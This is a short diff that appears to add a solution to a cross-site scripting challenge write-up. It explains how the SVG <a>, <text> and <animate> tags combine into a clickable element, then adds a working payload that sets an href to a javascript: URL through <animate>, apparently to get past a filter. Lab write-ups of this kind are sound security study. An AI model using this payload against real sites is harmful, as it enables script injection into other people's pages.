@@ -11,3 +11,6 @@ Reasons:
     <title>
 +) <text> is a sub-tag of svg-a for creating a tag that can be clicked to alert()
 +) <animate> tag is for alerting with using event handlers
+
+Solution:
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
